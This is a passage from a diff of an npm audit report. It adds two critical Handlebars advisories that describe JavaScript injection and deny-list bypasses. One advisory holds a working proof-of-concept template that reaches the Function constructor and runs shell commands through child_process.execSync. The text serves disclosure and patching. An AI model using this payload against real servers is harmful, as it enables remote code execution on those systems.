never a plain object or JSON-deserialized value.\n  ```javascript\n  if (typeof templateInput !== 'string') {\n    throw new TypeError('Template must be a string');\n  }\n  ```\n- Use the Handlebars **runtime-only** build (`handlebars/runtime`) on the server if templates are  pre-compiled at build time; `compile()` will be unavailable.\n\n## Credits\n\n### Variant `Program.blockParams`\n- [Nick Mykhailyshyn - @whoareme](https://x.com/whoareme33)\n- [jmoritzc53 ](https://github.com/jmoritzc53)\n- [bhaswanthc ](https://github.com/bhaswanthc)\n- [dinhvaren ](https://github.com/dinhvaren)\n- [n0tra4e ](https://github.com/n0tra4e) \n- [PellaML](https://github.com/PellaML)\n- [kustundag](https://github.com/kustundag)\n- [kagebunsher](https://github.com/kagebunsher)\n- [sanmatte](https://github.com/sanmatte)\n\n### Variant `BooleanLiteral|NumberLiteral.value`\n\n- [sondt99 ](https://github.com/sondt99) Thai Son Dinh from VinSOC Labs (R&D)\n- [Ahmed-Elmahgob ](https://github.com/Ahmed-Elmahgob)\n- [nikolakojic-rasit ](https://github.com/nikolakojic-rasit)\n- [vk-can](https://github.com/vk-can)\n- [shenhuanageshei](https://github.com/shenhuanageshei)\n- [kustundag](https://github.com/kustundag)\n- [kagebunsher](https://github.com/kagebunsher)\n- [ffasterss](https://github.com/ffasterss)\n\n### Variant `PathExpression.depth`\n\n- [hibrian827](https://github.com/hibrian827) Team Atlanta\n- [oss-security-shopify](https://github.com/oss-security-shopify)",
+      "reported_by": null,
+      "title": "Handlebars: JavaScript Injection via AST Type Confusion in compile (bypass of CVE-2026-33937)",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-106446"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "handlebars",
+      "vulnerable_versions": ">=4.0.0 <=4.7.9",
+      "github_advisory_id": "GHSA-8r5x-fm3f-whwj",
+      "recommendation": "Upgrade to version 4.7.10 or later",
+      "patched_versions": ">=4.7.10",
+      "updated": "2026-10-08T17:52:34.000Z",
+      "cvss": {
+        "score": 9.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-94",
+        "CWE-843"
+      ],
+      "url": "https://github.com/advisories/GHSA-8r5x-fm3f-whwj"
+    },
+    "1242173": {
+      "findings": [
+        {
+          "version": "4.7.8",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-p8wg-vrv2-v86f\n- https://nvd.nist.gov/vuln/detail/CVE-2026-106445\n- https://github.com/handlebars-lang/handlebars.js/pull/2185\n- https://github.com/handlebars-lang/handlebars.js/commit/ceec388abe1d1aac8f6369860d5f390fa71ef4fa\n- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.10\n- https://github.com/advisories/GHSA-p8wg-vrv2-v86f",
+      "created": "2026-10-08T17:52:26.000Z",
+      "id": 1242173,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nHandlebars can expose the `Function` constructor despite its prototype-access deny list. When a template reaches `Function.prototype`, its own `constructor` property is returned before the deny list is checked. An attacker who can render a controlled template with `allowProtoMethodsByDefault: true` can inject and execute arbitrary JavaScript, leading to Remote Code Execution on the server.\n\n## Description\n\n`lookupProperty` trusts own properties:\n\n```js\nif (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n  return result;\n}\n```\n\nNormally, prototype-derived values reach `resultIsAllowed`, which blocks dangerous method names such as `constructor`. However, `constructor` is itself an own property of prototype objects:\n\n```js\nFunction.prototype.constructor === Function;\nString.prototype.constructor === String;\nObject.prototype.constructor === Object;\n```\n\nAs a result, once a template reaches `Function.prototype`, looking up `constructor` returns `Function` without consulting the deny list.\n\n## Proof of Concept\n\nAn attacker needs to reach any prototype object where constructor is an own property, then access constructor to obtain Function. The shortest path requires only an accessible function in the template context:\n\n1. Access a function's prototype: {{lookup myFunction \"proto\"}} resolves to Function.prototype. The proto property is not in the deny list and is permitted when allowProtoMethodsByDefault is true (since the result is a function).\n2. Access constructor via own property bypass: {{lookup (lookup myFunction \"\\_\\_proto__\") \"constructor\"}} resolves to Function. Because Function.prototype.constructor is an own property of Function.prototype, hasOwnProperty returns true and lookupProperty returns the value without calling resultIsAllowed. The deny list entry constructor: false is never evaluated.\n3. Construct and execute arbitrary code: The attacker uses Function to create a function with attacker-controlled body content and triggers its execution through Handlebars' template rendering mechanics (e.g., #with calling functions, lambda processing, or #each iteration combined with apply).\n\n```javascript\nconst Handlebars = require('handlebars');\n\n// constructor deny list bypass via hasOwnProperty check in lookupProperty\nconst template = Handlebars.compile(\n    // construct code array from template string literal\n    '{{#with a}}' +\n      '{{lookup \"\" (push \"return process.mainModule.require(\\'child_process\\').execSync(\\'id\\').toString()\")}}' +\n      '{{lookup \"\" (pop)}}' +\n      '{{lookup \"\" (shift)}}' +\n    '{{/with}}' +\n\n    // access Function via own property bypass on Function.prototype.constructor\n    '{{lookup \"\" (@root.a.push (lookup (lookup fn \"__proto__\") \"constructor\"))}}' +\n\n    // #each sets depth0=Function without calling it, apply avoids hash body\n    '{{#each @root}}{{#if @index}}{{else}}' +\n      '{{#with (this.apply null @root.a)}}{{this}}{{/with}}' +\n    '{{/if}}{{/each}}'\n);\n\nconst result = template(\n    { fn: function(){}, a: [0] },\n    { allowProtoMethodsByDefault: true }\n);\n\nconsole.log(result.trim());\n\n// output: uid=1000(node) gid=1000(node) groups=1000(node)\n```\n\n## Workarounds\n\nDo not set `allowProtoMethodsByDefault: true` when compiling untrusted templates with untrusted data.\n\nIf you are using packages like [hbs](https://www.npmjs.com/package/hbs) which set `allowProtoMethodsByDefault: true` by default, you have to update Handlebars to the latest version.",
+      "reported_by": null,
+      "title": "Handlebars: JavaScript Injection via Own Property Check Bypass",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-106445"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "handlebars",
+      "vulnerable_versions": ">=3.0.0 <=4.7.9",
+      "github_advisory_id": "GHSA-p8wg-vrv2-v86f",
+      "recommendation": "Upgrade to version 4.7.10 or later",
+      "patched_versions": ">=4.7.10",
+      "updated": "2026-10-12T14:33:17.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-184",
+        "CWE-1289"
+      ],
+      "url": "https://github.com/advisories/GHSA-p8wg-vrv2-v86f"
     }
   },
   "muted": [],
@@ -3780,9 +4474,9 @@
     "vulnerabilities": {
       "info": 0,
       "low": 5,
-      "moderate": 27,
-      "high": 49,
-      "critical": 1
+      "moderate": 33,
+      "high": 56,
+      "critical": 3
     },
     "dependencies": 1073,
     "devDependencies": 0,
